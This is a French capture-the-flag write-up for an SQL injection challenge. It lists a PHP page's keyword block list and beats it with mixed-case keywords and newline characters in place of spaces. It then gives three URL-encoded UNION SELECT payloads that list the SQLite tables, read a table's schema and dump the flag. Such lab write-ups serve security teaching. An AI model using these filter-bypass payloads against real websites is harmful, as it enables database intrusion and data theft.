# Level 3

Auteur : [HappoSnake](https://github.com/pathibault/)

Briève description : 
<img src=../SQL_Challenge.png>

# Sources
- https://finctf.ettic.net/challenges#Level%201-23
- [fichier source](./source.php)

# Solution
Dans le fichier source, il y a les mots suivants qui sont interdit :
```
- union
- UNION
- select
- SELECT
- -
- /
- *
- #
- espace blanc (whitespace)
- =
```
Dans SQLite, il y a plusieurs possibilités pour un espace blanc.
```
0A, 0D, 0C, 09, 20
```
Le flag étant dans une autre table, nous devons lister les tables en ajoutant directement dans l'url
```
?product=%27%0AUnIon%0ASeLect%0A1%2C2%2Ctbl_name%0Afrom%0Asqlite_master%3B
```
<img src=./tables.png>

<br />
Maintenant, trouvons les colonnes de la table «super_secret_table_name».

```
product=%27%0AUnIon%0ASeLect%0A1%2C2%2Csql%0Afrom%0Asqlite_master%0Awhere%0Aname%0Alike%0A%27super_secret_table_name%27%3B
```
<img src=./colonnes.png>

<br />
Pour finir, affichons les informations de la table «super_secret_table_name».

```
product=%27%0AUnIon%0ASeLect%0Aid%2C0%2Cspecial_value%0Afrom%0Asuper_secret_table_name%3B
```
<img src=./flag.png>